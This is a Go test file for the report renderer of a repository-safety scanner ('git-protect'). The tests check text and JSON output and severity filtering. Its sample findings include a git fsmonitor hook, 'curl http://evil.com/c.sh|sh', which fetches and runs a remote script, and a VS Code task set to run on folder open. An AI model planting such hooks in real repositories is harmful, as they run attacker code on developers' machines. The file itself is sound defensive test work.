package output_test

import (
	"bytes"
	"encoding/json"
	"strings"
	"testing"

	"github.com/moldabekov/git-protect/internal/output"
	"github.com/moldabekov/git-protect/internal/scanner"
)

func sampleReport() scanner.Report {
	return scanner.Report{
		Findings: []scanner.Finding{
			{
				Severity: scanner.Critical,
				Module:   "config",
				Path:     ".git/config",
				Message:  `core.fsmonitor = "curl http://evil.com/c.sh|sh"`,
				Detail:   "executes on git status",
			},
			{
				Severity: scanner.High,
				Module:   "ide-configs",
				Path:     ".vscode/tasks.json",
				Message:  `task "setup" has runOn: folderOpen`,
			},
			{
				Severity: scanner.Medium,
				Module:   "scripts",
				Path:     "scripts/setup.sh",
				Message:  "contains curl to external URL",
			},
			{
				Severity: scanner.Info,
				Module:   "ci-pipelines",
				Path:     ".github/workflows/ci.yml",
				Message:  "workflow found",
			},
		},
	}
}

func TestRenderText_NonEmpty(t *testing.T) {
	var buf bytes.Buffer
	output.RenderText(&buf, sampleReport(), scanner.Info)
	out := buf.String()
	if out == "" {
		t.Fatal("RenderText output is empty")
	}
	if !strings.Contains(out, "CRITICAL") {
		t.Error("expected CRITICAL in output")
	}
	if !strings.Contains(out, "HIGH") {
		t.Error("expected HIGH in output")
	}
	if !strings.Contains(out, "MEDIUM") {
		t.Error("expected MEDIUM in output")
	}
	if !strings.Contains(out, "INFO") {
		t.Error("expected INFO in output")
	}
}

func TestRenderText_SeverityFilter(t *testing.T) {
	var buf bytes.Buffer
	output.RenderText(&buf, sampleReport(), scanner.High)
	out := buf.String()

	if !strings.Contains(out, "CRITICAL") {
		t.Error("expected CRITICAL in output when min=HIGH")
	}
	if !strings.Contains(out, "HIGH") {
		t.Error("expected HIGH in output when min=HIGH")
	}
	if strings.Contains(out, "MEDIUM") {
		t.Error("unexpected MEDIUM in output when min=HIGH")
	}
	if strings.Contains(out, "INFO") {
		t.Error("unexpected INFO in output when min=HIGH")
	}
}

func TestRenderText_EmptyReport(t *testing.T) {
	var buf bytes.Buffer
	output.RenderText(&buf, scanner.Report{}, scanner.Info)
	if buf.Len() != 0 {
		t.Errorf("expected empty output for empty report, got %q", buf.String())
	}
}

func TestRenderJSON_ValidParse(t *testing.T) {
	var buf bytes.Buffer
	err := output.RenderJSON(&buf, sampleReport())
	if err != nil {
		t.Fatalf("RenderJSON error: %v", err)
	}

	var parsed struct {
		Findings []struct {
			Severity string `json:"severity"`
			Module   string `json:"module"`
			Path     string `json:"path"`
			Message  string `json:"message"`
		} `json:"findings"`
		Blocking bool `json:"blocking"`
		Count    int  `json:"count"`
	}
	if err := json.Unmarshal(buf.Bytes(), &parsed); err != nil {
		t.Fatalf("JSON parse error: %v\noutput: %s", err, buf.String())
	}

	if !parsed.Blocking {
		t.Error("expected blocking=true")
	}
	if parsed.Count != 4 {
		t.Errorf("count = %d, want 4", parsed.Count)
	}
	if len(parsed.Findings) != 4 {
		t.Errorf("findings length = %d, want 4", len(parsed.Findings))
	}
	if parsed.Findings[0].Severity != "CRITICAL" {
		t.Errorf("first finding severity = %q, want CRITICAL", parsed.Findings[0].Severity)
	}
}

func TestRenderJSON_NonBlocking(t *testing.T) {
	report := scanner.Report{
		Findings: []scanner.Finding{
			{Severity: scanner.Medium, Module: "scripts", Message: "curl found"},
		},
	}
	var buf bytes.Buffer
	if err := output.RenderJSON(&buf, report); err != nil {
		t.Fatal(err)
	}
	var parsed struct {
		Blocking bool `json:"blocking"`
		Count    int  `json:"count"`
	}
	if err := json.Unmarshal(buf.Bytes(), &parsed); err != nil {
		t.Fatal(err)
	}
	if parsed.Blocking {
		t.Error("expected blocking=false for MEDIUM-only report")
	}
	if parsed.Count != 1 {
		t.Errorf("count = %d, want 1", parsed.Count)
	}
}
